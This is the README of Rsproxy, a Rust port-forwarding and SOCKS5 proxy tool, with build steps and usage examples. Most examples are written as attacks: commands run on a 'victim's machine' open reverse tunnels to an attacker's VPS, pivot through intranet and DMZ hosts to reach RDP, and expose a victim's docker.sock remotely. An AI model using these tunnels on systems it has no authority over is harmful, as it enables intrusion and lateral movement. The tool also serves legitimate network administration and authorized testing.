# Rsproxy

Rsproxy is a lightweight port-forwarding and socks proxy tool written in Rust ðŸ¦€

## Build

The project is under development, so you need to build yourself.

```bash
git clone https://github.com/X1r0z/rsproxy
cd rsproxy
cargo build --release
```

## Feature

- TCP/UDP port forwarding
- Unix domain socket forwarding (e.g. `/var/run/docker.sock`)
- Multi network layer support
- TLS encryption support
- Socks5 proxy

## Usage

### TCP Port Forwarding

Listen on `0.0.0.0:8888` and `0.0.0.0:9999`, forward traffic between them.

*specify `127.0.0.1:PORT` to listen on local address*

```bash
./rsproxy fwd -l 8888 -l 9999
```

Listen on `0.0.0.0:8888`, forward traffic to a remote address.

```bash
./rsproxy fwd -l 8888 -r 10.0.0.1:9999
```

Connect `10.0.0.1:8888` and `10.0.0.2:9999`, forward traffic between them.

```bash
./rsproxy fwd -r 10.0.0.1:8888 -r 10.0.0.1:9999
```

A basic example of accessing an intranet address through port forwarding.

```bash
# on attacker's machine
./rsproxy fwd -l 8888 -l 9999

# on victim's machine
./rsproxy fwd -r 10.0.0.1:3389 -r vps:8888

# now attacker can access 10.0.0.1:3389 through vps:9999
```

A complex example, multi-layer proxy in the intranet.

```bash
# on machine A (10.0.0.1, 172.16.0.1)
./rsproxy fwd -r 10.0.0.10:3389 -l 7777

# on machine B (172.16.0.2, 192.168.1.1)
./rsproxy fwd -r 172.16.0.1:7777 -r 192.168.1.2:8888

# on machine C (192.168.1.2, DMZ)
./rsproxy fwd -l 8888 -r vps:9999

# on attacker's machine
./rsproxy fwd -l 9999 -l 33890

# now attacker can access 10.0.0.10:3389 through vps:33890
```

Note that the command on machine B need to be executed last. Because this mode will check the connectivity between the two remote addresses.

### UDP Port Forwarding

The usage of UDP port forwarding is similar to TCP, simply add `-u` flag.

This feature may be unstable.

Note that when using **reverse** UDP port forwarding, a handshake packet will be sent to keep the client address.

Example:

```bash
# on attacker's machine
./rsproxy fwd -l 8888 -l 9999

# on victim's machine
./rsproxy fwd -r 10.0.0.1:53 -r vps:8888
```

The victim's machine will send a handshake packet to `vps:8888`, which is the attacker's machine.

The attacker's machine will remember the client address, and forward the traffic to it when user connects to `vps:9999`.

**Because of the handshake packet, the parameters must be in order and cannot be swapped.**

Another example:

```bash
# on machine A (10.0.0.1, 192.168.1.1, intranet)
./rsproxy fwd -r 10.0.0.10:53 -l 7777

# on machine B (192.168.1.2, DMZ)
./rsproxy fwd -r 192.168.1.1:7777 -r vps:8888 # this command need to be executed last

# on attacker's machine
./rsproxy fwd -l 8888 -l 9999
```

The handshake packet will be sent from machine B to the attacker's machine (port 8888). Users can connect to the intranet through port 9999.

### Unix domain socket Forwarding

A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between two processes running on the same machine.

`/var/run/docker.sock` and `/var/run/php-fpm.sock` are common Unix domain sockets.

You can forward Unix domain socket to a TCP port.

```bash
./rsproxy fwd -s /var/run/docker.sock -l 4444

# get docker version
curl http://127.0.0.1:4444/version
```

or in the reverse mode.

```bash
# on victim's machine
./rsproxy fwd -s /var/run/docker.sock -r vps:4444

# on attacker's machine
./rsproxy fwd -l 4444 -l 5555

# get docker version
curl http://vps:5555/version
```

### Socks Proxy

Rsproxy supports socks5 protocol (no authentication)

Forward socks proxy.

```bash
./rsproxy socks -l 1080
```

Reverse socks proxy.

```bash
# on attacker's machine
./rsproxy socks -l 7777 -l 8888

# on victim's machine
./rsproxy socks -r vps:7777

# now attacker can use socks proxy on vps:8888
```
